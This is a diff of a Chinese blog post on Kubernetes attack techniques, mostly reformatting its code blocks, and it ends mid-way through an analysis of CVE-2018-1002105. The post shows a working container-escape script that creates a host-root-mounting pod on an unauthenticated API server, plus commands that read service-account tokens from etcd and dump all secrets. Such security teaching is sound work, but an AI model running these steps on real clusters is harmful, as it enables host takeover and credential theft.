@@ -18,7 +18,7 @@
 <meta name="application-name" content="Geekby&#39;s Blog">
 <meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" /><link rel="prev" href="https://www.geekby.site/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/" /><link rel="next" href="https://www.geekby.site/2021/12/api%E5%AE%89%E5%85%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/11/k8s%E5%AE%89%E5%85%A8/" /><link rel="prev" href="https://www.geekby.site/2021/11/javascript%E5%8F%8D%E6%B7%B7%E6%B7%86/" /><link rel="next" href="https://www.geekby.site/2021/12/samaccountname-spoofing/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -288,9 +288,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 存在风险的配置方式</span>
-kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s1">&#39;^*$&#39;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 存在风险的配置方式</span>
+</span></span><span class="line"><span class="cl">kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s1">&#39;^*$&#39;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>另外，默认情况下 Dashboard 需要登录认证，但是，如果用户在 Dashboard 的启动参数中添加了 <code>--enable-skip-login</code> 选项，那么攻击者就能够直接点击 Dashboard 界面的“跳过”，按钮，无须登录便可直接进入 Dashboard。</p>
 <h4 id="123-kubelet">1.2.3 Kubelet</h4>
@@ -303,8 +303,8 @@ kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl http://localhost:10248/healthz
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://localhost:10248/healthz
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>10248 端口的服务相对简单，不存在特别的风险。但10250 端口却存在一定风险。默认情况下 API Server 在访问 Kubelet 的API 时需要使用客户端证书，相对来说是比较安全的。但是如果出现以下任一情况：</p>
 <ul>
@@ -321,8 +321,8 @@ kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">etcdctl --endpoints https://localhost:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/serviceaccounts/kube-system/default -o json
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">etcdctl --endpoints https://localhost:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/serviceaccounts/kube-system/default -o json
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="2-k8s-组件配置不当的攻击案例">2 k8s 组件配置不当的攻击案例</h2>
 <h3 id="21-api-server-未授权访问">2.1 API Server 未授权访问</h3>
@@ -333,8 +333,8 @@ kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl -s <span class="nv">$TARGETIP</span>:8080 get pod
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl -s <span class="nv">$TARGETIP</span>:8080 get pod
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>进一步创建挂载宿主机目录的 Pod 进行容器逃逸，获得宿主机权限，相关操作如下：</p>
 <div class="highlight"><div class="chroma">
@@ -369,35 +369,35 @@ kube proxy --address 0.0.0.0 --accept-host<span class="o">=</span><span class="s
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
-</span><span class="cp"></span>
-cat <span class="s">&lt;&lt; EOF &gt; escape.yaml
-</span><span class="s"># attacker.yaml
-</span><span class="s">apiVersion: v1
-</span><span class="s">kind: Pod
-</span><span class="s">metadata:
-</span><span class="s">  name: attacker
-</span><span class="s">spec:
-</span><span class="s">  containers:
-</span><span class="s">  - name: ubuntu
-</span><span class="s">    image: ubuntu:latest
-</span><span class="s">    imagePullPolicy: IfNotPresent
-</span><span class="s">    # Just spin &amp; wait forever
-</span><span class="s">    command: [ &#34;/bin/bash&#34;, &#34;-c&#34;, &#34;--&#34; ]
-</span><span class="s">    args: [ &#34;while true; do sleep 30; done;&#34; ]
-</span><span class="s">    volumeMounts:
-</span><span class="s">    - name: escape-host
-</span><span class="s">      mountPath: /host-escape-door
-</span><span class="s">  volumes:
-</span><span class="s">    - name: escape-host
-</span><span class="s">      hostPath:
-</span><span class="s">        path: /
-</span><span class="s">EOF</span>
-
-kubectl -s TARGET-IP:8080 apply -f escape.yaml
-sleep <span class="m">8</span>
-kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">cat <span class="s">&lt;&lt; EOF &gt; escape.yaml
+</span></span></span><span class="line"><span class="cl"><span class="s"># attacker.yaml
+</span></span></span><span class="line"><span class="cl"><span class="s">apiVersion: v1
+</span></span></span><span class="line"><span class="cl"><span class="s">kind: Pod
+</span></span></span><span class="line"><span class="cl"><span class="s">metadata:
+</span></span></span><span class="line"><span class="cl"><span class="s">  name: attacker
+</span></span></span><span class="line"><span class="cl"><span class="s">spec:
+</span></span></span><span class="line"><span class="cl"><span class="s">  containers:
+</span></span></span><span class="line"><span class="cl"><span class="s">  - name: ubuntu
+</span></span></span><span class="line"><span class="cl"><span class="s">    image: ubuntu:latest
+</span></span></span><span class="line"><span class="cl"><span class="s">    imagePullPolicy: IfNotPresent
+</span></span></span><span class="line"><span class="cl"><span class="s">    # Just spin &amp; wait forever
+</span></span></span><span class="line"><span class="cl"><span class="s">    command: [ &#34;/bin/bash&#34;, &#34;-c&#34;, &#34;--&#34; ]
+</span></span></span><span class="line"><span class="cl"><span class="s">    args: [ &#34;while true; do sleep 30; done;&#34; ]
+</span></span></span><span class="line"><span class="cl"><span class="s">    volumeMounts:
+</span></span></span><span class="line"><span class="cl"><span class="s">    - name: escape-host
+</span></span></span><span class="line"><span class="cl"><span class="s">      mountPath: /host-escape-door
+</span></span></span><span class="line"><span class="cl"><span class="s">  volumes:
+</span></span></span><span class="line"><span class="cl"><span class="s">    - name: escape-host
+</span></span></span><span class="line"><span class="cl"><span class="s">      hostPath:
+</span></span></span><span class="line"><span class="cl"><span class="s">        path: /
+</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kubectl -s TARGET-IP:8080 apply -f escape.yaml
+</span></span><span class="line"><span class="cl">sleep <span class="m">8</span>
+</span></span><span class="line"><span class="cl">kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-dashboard-未授权访问">2.2 Dashboard 未授权访问</h3>
 <p>Kubernetes Dashboard 是一个基于 Web 的 Kubernetes 用户界面。借助 Dashboard，能够获得当前集群中应用运行状态的概览，创建或修改 Kubernetes 资源。</p>
@@ -407,8 +407,8 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Dashboard 需要配置 token 才能够访问，但是提供了「跳过」选项。从 1.10.1 版本起，Dashboard 默认禁用了「跳过」按钮。然而，如果用户在运行 Dashboard 时添加了 <code>--enable-skip-login</code>，那么攻击者只要网络可达，就能进入 Dashboard：</p>
 <p><img
@@ -483,8 +483,8 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">kubectl --insecure-skip-tls-verify<span class="o">=</span><span class="nb">true</span> --server<span class="o">=</span><span class="s2">&#34;https://ip:6443&#34;</span> --token<span class="o">=</span><span class="s2">&#34;eyJhbG......&#34;</span> get secrets --all-namespaces
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kubectl --insecure-skip-tls-verify<span class="o">=</span><span class="nb">true</span> --server<span class="o">=</span><span class="s2">&#34;https://ip:6443&#34;</span> --token<span class="o">=</span><span class="s2">&#34;eyJhbG......&#34;</span> get secrets --all-namespaces
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="3-k8s-权限提升漏洞---cve-2018-1002105">3 k8s 权限提升漏洞 - CVE-2018-1002105</h2>
 <blockquote>
@@ -518,16 +518,16 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader</span><span class="w">
-</span><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
-</span><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;&#34;</span><span class="p">]</span><span class="w"> </span><span class="c"># &#34;&#34; 标明 core API 组</span><span class="w">
-</span><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;pods&#34;</span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;get&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;watch&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;list&#34;</span><span class="p">]</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">rules</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;&#34;</span><span class="p">]</span><span class="w"> </span><span class="c"># &#34;&#34; 标明 core API 组</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;pods&#34;</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;get&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;watch&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;list&#34;</span><span class="p">]</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>RoleBinding</code> 和 <code>ClusterRoleBinding</code> 则用来将 <code>Role</code> 和 <code>ClusterRole</code> 定义的权限赋予一个或一组特定的用户。</p>
 <p>下面的例子中的 <code>RoleBinding</code> 将 <code>pod-reader</code> Role 授予在 <code>default</code> 命名空间中的用户 <code>jane</code>。 这样，用户 jane 就具有了读取 <code>default</code> 命名空间中 pods 的权限。</p>
@@ -551,23 +551,23 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
-</span><span class="w"></span><span class="c"># 此角色绑定允许 &#34;jane&#34; 读取 &#34;default&#34; 名字空间中的 Pods</span><span class="w">
-</span><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
-</span><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">read-pods</span><span class="w">
-</span><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
-</span><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
-</span><span class="w"></span><span class="c"># 你可以指定不止一个“subject（主体）”</span><span class="w">
-</span><span class="w"></span>- <span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">User</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">jane</span><span class="w"> </span><span class="c"># &#34;name&#34; 是区分大小写的</span><span class="w">
-</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
-</span><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
-</span><span class="w">  </span><span class="c"># &#34;roleRef&#34; 指定与某 Role 或 ClusterRole 的绑定关系</span><span class="w">
-</span><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w"> </span><span class="c"># 此字段必须是 Role 或 ClusterRole</span><span class="w">
-</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader    </span><span class="w"> </span><span class="c"># 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><span class="w">
-</span><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
-</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io/v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># 此角色绑定允许 &#34;jane&#34; 读取 &#34;default&#34; 名字空间中的 Pods</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">RoleBinding</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">read-pods</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">subjects</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c"># 你可以指定不止一个“subject（主体）”</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span>- <span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">User</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">jane</span><span class="w"> </span><span class="c"># &#34;name&#34; 是区分大小写的</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">roleRef</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="c"># &#34;roleRef&#34; 指定与某 Role 或 ClusterRole 的绑定关系</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Role</span><span class="w"> </span><span class="c"># 此字段必须是 Role 或 ClusterRole</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">pod-reader    </span><span class="w"> </span><span class="c"># 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">apiGroup</span><span class="p">:</span><span class="w"> </span><span class="l">rbac.authorization.k8s.io</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="312-websocket">3.1.2 WebSocket</h4>
 <p><a href="https://zh.wikipedia.org/wiki/WebSocket" target="_blank" rel="noopener noreffer">WebSocket</a> 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在 WebSocket API中，浏览器和服务器只需要完成一次握手，两者之间就可以创建持久性的连接，并进行双向数据传输。</p>
@@ -585,15 +585,15 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">GET</span> <span class="nn">/chat</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">server.example.com</span>
-<span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
-<span class="n">Sec-WebSocket-Key</span><span class="o">:</span> <span class="l">dGhlIHNhbXBsZSBub25jZQ==</span>
-<span class="n">Origin</span><span class="o">:</span> <span class="l">http://example.com</span>
-<span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat, superchat</span>
-<span class="n">Sec-WebSocket-Version</span><span class="o">:</span> <span class="l">13</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/chat</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">server.example.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-WebSocket-Key</span><span class="o">:</span> <span class="l">dGhlIHNhbXBsZSBub25jZQ==</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://example.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat, superchat</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-WebSocket-Version</span><span class="o">:</span> <span class="l">13</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>服务器回应：</p>
 <div class="highlight"><div class="chroma">
@@ -605,12 +605,12 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">101</span> <span class="ne">Switching Protocols</span>
-<span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
-<span class="n">Sec-WebSocket-Accept</span><span class="o">:</span> <span class="l">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>
-<span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">101</span> <span class="ne">Switching Protocols</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-WebSocket-Accept</span><span class="o">:</span> <span class="l">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>
+</span></span><span class="line"><span class="cl"><span class="n">Sec-WebSocket-Protocol</span><span class="o">:</span> <span class="l">chat</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="313-kubernetes-api-server">3.1.3 Kubernetes API Server</h4>
 <p>API Server 通过 RESTful API 提供服务。除此之外，它还具有代理转发的功能，将外界对于部分 API的调用转发到后端实际执行这些 API 功能的组件上。例如，常用的对 pod 执行 exec 的操作就是 API Server 作为代理，将请求转发到对应节点的 Kubelet 上，由该 Kubelet 执行具体命令。这个过程还涉及从 HTTP 到 Websocket 的协议升级过程，API Server 能够作为代理维护一条 WebSocket 连接。</p>
@@ -633,20 +633,20 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 
-</span><span class="c1">// ServeHTTP handles the proxy request
-</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">h</span> <span class="o">*</span><span class="nx">UpgradeAwareHandler</span><span class="p">)</span> <span class="nf">ServeHTTP</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">req</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nf">tryUpgrade</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
-		<span class="k">return</span>
-	<span class="p">}</span>
-	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">UpgradeRequired</span> <span class="p">{</span>
-		<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">NewBadRequest</span><span class="p">(</span><span class="s">&#34;Upgrade request required&#34;</span><span class="p">))</span>
-		<span class="k">return</span>
-	<span class="p">}</span>
-  <span class="o">...</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 
+</span></span></span><span class="line"><span class="cl"><span class="c1">// ServeHTTP handles the proxy request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">h</span> <span class="o">*</span><span class="nx">UpgradeAwareHandler</span><span class="p">)</span> <span class="nf">ServeHTTP</span><span class="p">(</span><span class="nx">w</span> <span class="nx">http</span><span class="p">.</span><span class="nx">ResponseWriter</span><span class="p">,</span> <span class="nx">req</span> <span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Request</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nf">tryUpgrade</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">h</span><span class="p">.</span><span class="nx">UpgradeRequired</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">h</span><span class="p">.</span><span class="nx">Responder</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">w</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">NewBadRequest</span><span class="p">(</span><span class="s">&#34;Upgrade request required&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">...</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>它在最开始调用了 <code>tryUpgrade</code> 函数，尝试进行协议升级。漏洞正存在于该函数的处理逻辑之中，跟进该函数。</p>
 <p>首先，该函数要判断原始请求是否为协议升级请求（请求头中是否包含 Connection 和 Upgrade 项）：</p>
@@ -659,12 +659,12 @@ kubectl -s TARGET-IP:8080 <span class="nb">exec</span> -it attacker /bin/bash
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// tryUpgrade returns true if the request was handled.
-</span><span class="c1"></span><span class="k">if</span> <span class="p">!</span><span class="nx">httpstream</span><span class="p">.</span><span class="nf">IsUpgradeRequest</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span> <span class="p">{</span>
-	<span class="nx">glog</span><span class="p">.</span><span class="nf">V</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">Infof</span><span class="p">(</span><span class="s">&#34;Request was not an upgrade&#34;</span><span class="p">)</span>
-	<span class="k">return</span> <span class="kc">false</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="c1">// tryUpgrade returns true if the request was handled.
